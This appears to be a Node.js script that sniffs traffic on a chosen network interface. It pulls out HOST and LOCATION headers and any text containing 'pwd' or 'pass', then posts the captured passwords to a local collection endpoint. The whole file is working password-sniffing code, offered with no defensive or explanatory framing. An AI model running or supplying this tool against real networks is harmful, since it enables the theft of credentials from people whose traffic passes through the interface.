const sniffer = require('./sniffer.js');
const request = require('request');

const url = 'http://localhost:3000/hashmap/sniffing';
const INTERFACE = process.argv[2];

const send = (message) => {
    const options = {
        uri: url,
        method: 'POST',
        json: message
      };

    request.post(url, options);
}

sniffer(INTERFACE, text => {
    if(!text) return;

    var host, location, pass;

    if(text.match(/^HOST:/mi)) {
        host = text.match(/^HOST:(.+)$/mi)[1].trim();
    }

    if(text.match(/^LOCATION:/mi)) {
        location = text.match(/^LOCATION:(.+)$/mi)[1].trim();
    }

    if(text.match(/pwd|pass/)) {
        pass = text;
    }

    //host || location || pass) && send({
    (pass) && send({
        host,
        location,
        pass
    });
});
